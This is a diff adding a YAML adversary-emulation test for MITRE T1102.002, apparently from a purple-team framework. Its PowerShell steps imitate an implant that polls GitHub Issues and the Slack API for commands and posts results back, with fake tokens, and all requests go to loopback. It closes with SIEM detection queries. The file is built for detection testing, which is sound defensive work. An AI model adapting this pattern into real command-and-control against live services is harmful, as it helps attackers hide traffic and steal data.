@@ -1,0 +1,114 @@
+id: T1102.002_web_service_bidirectional
+name: "Web Service — Bidirectional Communication"
+mitre_technique: "T1102.002"
+mitre_tactic: "command_and_control"
+description: >
+  Adversaries use legitimate web services as a full bidirectional C2 channel —
+  sending commands to the implant and receiving results back through the same
+  service. Examples: GitHub Issues/comments (adversary posts command as issue comment,
+  implant reads and replies), Slack/Discord webhooks (adversary posts command to
+  channel, implant reads and posts results), Microsoft Teams, or cloud storage APIs.
+  All traffic appears as legitimate use of trusted platforms, making it extremely
+  difficult to block without disrupting legitimate business operations.
+author: stanleytobias
+created: "2026-01-01"
+platform: windows
+references:
+  - https://attack.mitre.org/techniques/T1102/002/
+
+steps:
+  - step: 1
+    type: marker
+    description: "Pre-execution context"
+    message: "Starting T1102.002 — Bidirectional Web Service C2 simulation (loopback only)"
+
+  - step: 2
+    type: exec_powershell
+    description: "Simulate GitHub Issues bidirectional C2 — poll for commands, post results"
+    command: |
+      Write-Host "[PAS] GitHub Issues bidirectional C2 pattern:"
+      Write-Host "[PAS] Implant polls: GET /repos/[attacker]/[repo]/issues?state=open"
+      Write-Host "[PAS] Reads command from issue body, executes, posts result as comment"
+
+      # Simulate GitHub API poll (loopback)
+      try {
+          $req = [System.Net.WebRequest]::Create("http://127.0.0.1/repos/attacker/c2repo/issues")
+          $req.Headers.Add("Authorization", "token PAS_FAKE_GH_TOKEN")
+          $req.Headers.Add("Accept", "application/vnd.github.v3+json")
+          $req.UserAgent = "PAS-implant/1.0"
+          $req.Timeout   = 500
+          $req.GetResponse() | Out-Null
+      } catch {}
+      Write-Host "[PAS] GitHub API poll telemetry generated"
+
+      # Simulate posting result as issue comment
+      try {
+          $req  = [System.Net.WebRequest]::Create("http://127.0.0.1/repos/attacker/c2repo/issues/1/comments")
+          $req.Method      = "POST"
+          $req.ContentType = "application/json"
+          $req.Headers.Add("Authorization", "token PAS_FAKE_GH_TOKEN")
+          $req.Timeout     = 500
+          $body = '{"body":"PAS-T1102.002-RESULT: whoami output here"}'
+          $bytes = [Text.Encoding]::UTF8.GetBytes($body)
+          $s = $req.GetRequestStream()
+          $s.Write($bytes, 0, $bytes.Length); $s.Close()
+          $req.GetResponse() | Out-Null
+      } catch {}
+      Write-Host "[PAS] GitHub comment POST (result upload) telemetry generated"
+
+  - step: 3
+    type: exec_powershell
+    description: "Simulate Slack/Discord webhook bidirectional C2"
+    command: |
+      Write-Host "[PAS] Slack/Discord webhook C2 pattern:"
+      Write-Host "[PAS] Adversary posts command to Slack channel via webhook"
+      Write-Host "[PAS] Implant reads channel via Slack API, executes, posts result back"
+
+      # Simulate Slack API command poll
+      try {
+          $req = [System.Net.WebRequest]::Create("http://127.0.0.1/api/conversations.history?channel=C1234567")
+          $req.Headers.Add("Authorization", "Bearer PAS-FAKE-SLACK-TOKEN")
+          $req.Timeout = 500
+          $req.GetResponse() | Out-Null
+      } catch {}
+      Write-Host "[PAS] Slack API poll telemetry generated"
+
+      # Simulate result post back via webhook
+      try {
+          $req  = [System.Net.WebRequest]::Create("http://127.0.0.1/services/TXXXXXXXX/BXXXXXXXX/XXXXXXXX")
+          $req.Method      = "POST"
+          $req.ContentType = "application/json"
+          $req.Timeout     = 500
+          $body = '{"text":"PAS-T1102.002-RESULT: command executed successfully"}'
+          $bytes = [Text.Encoding]::UTF8.GetBytes($body)
+          $s = $req.GetRequestStream()
+          $s.Write($bytes, 0, $bytes.Length); $s.Close()
+          $req.GetResponse() | Out-Null
+      } catch {}
+      Write-Host "[PAS] Slack webhook result POST telemetry generated"
+
+  - step: 4
+    type: sleep
+    description: "Allow telemetry to flush"
+    seconds: 3
+
+  - step: 5
+    type: marker
+    description: "Post-execution prompt"
+    message: "Check SIEM — scripting process polling GitHub/Slack/Discord APIs with Bearer tokens, POST results to same services"
+
+cleanup:
+  - step: 1
+    type: marker
+    description: "No persistent artifacts"
+    message: "T1102.002 cleanup complete — no persistent artifacts"
+
+analyst_checklist:
+  - "Network event: powershell.exe making authenticated API calls to github.com, slack.com, or discord.com"
+  - "Script block logging: Bearer token + API endpoint for GitHub Issues, Slack, or Discord from powershell.exe"
+  - "Sentinel: DeviceNetworkEvents | where RemoteUrl contains 'api.github.com' and InitiatingProcessFileName == 'powershell.exe'"
+  - "Sentinel: DeviceNetworkEvents | where RemoteUrl contains 'slack.com/api' and InitiatingProcessFileName == 'powershell.exe'"
+  - "MDE alert: 'Legitimate web service used as C2 channel'"
+  - "CONTROL CHECK: Block GitHub API (api.github.com) from non-developer endpoints via proxy"
+  - "CONTROL CHECK: Defender for Cloud Apps — alert on unusual API activity patterns (e.g., polling GitHub issues every 60s)"
+  - "CONTROL CHECK: OAuth token audit in GitHub/Slack — revoke unused personal access tokens, rotate regularly"
